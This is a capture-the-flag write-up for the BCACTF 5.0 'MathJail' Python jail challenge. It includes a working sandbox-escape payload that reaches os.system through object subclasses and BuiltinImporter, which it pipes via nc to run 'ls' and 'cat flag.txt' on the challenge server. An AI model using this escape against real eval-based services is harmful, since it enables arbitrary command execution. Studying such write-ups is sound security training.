# BCACTF 5.0

## MathJail

> Just a fun python calculator! Good for math class.
> 
> Author: Zevi
> 
> [`pycalculator.py`](pycalculator.py)

Tags: _misc_

## Solution
The challenge is another variant of a python jail. Our input is put through `eval` with `builtins` disabled.

```python
print("Welcome to your friendly python calculator!")
equation = input("Enter your equation below and I will give you the answer:\n")
while equation!="e":
    answer = eval(equation, {"__builtins__":{}},{})
    print(f"Here is your answer: {answer}")
    equation = input("Enter your next equation below (type 'e' to exit):\n")
print("Goodbye!")
```

This can easily be bypassed by using pythons reflection functionality. The following payload allows executing system commands.

```python
echo "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter'][0].load_module('os').system('ls')"
```

Doing this we find the `flag.txt` is in the current folder.

```bash
$ echo "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter'][0].load_module('os').system('ls')" | nc challs.bcactf.com 31289
Welcome to your friendly python calculator!
Enter your equation below and I will give you the answer:
flag.txt
pycalculator.py
ynetd
ynetd.c
Here is your answer: 0
Enter your next equation below (type 'e' to exit):
```

Now we only have to read it.

```bash
$ echo "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter'][0].load_module('os').system('cat flag.txt')" | nc challs.bcactf.com 31289
Welcome to your friendly python calculator!
Enter your equation below and I will give you the answer:
bcactf{math_is_so_difficult_right?8943yfg09whgh3r89ghwerp}Here is your answer: 0
Enter your next equation below (type 'e' to exit):
```

Flag `bcactf{math_is_so_difficult_right?8943yfg09whgh3r89ghwerp}`